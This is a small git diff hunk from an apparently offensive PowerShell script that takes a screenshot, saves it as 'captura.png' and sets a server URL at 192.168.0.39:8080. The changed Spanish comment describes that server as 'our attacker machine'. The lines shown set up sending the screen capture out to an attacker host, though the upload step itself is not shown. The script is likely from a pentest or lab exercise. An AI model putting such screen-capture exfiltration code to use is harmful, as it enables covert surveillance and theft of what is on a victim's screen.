@@ -14,7 +14,7 @@ $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 
 $bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png)
 
-#Aqui puedes indicar la dirección de tu servidor y el nombre del archivo que quieras
+#Establecer la URL del servidor de nuestra máquina atacante y el nombre del archivo
 $serverUrl = "http://192.168.0.39:8080"
 $filePath = "captura.png"
 $fileName = "captura.png"
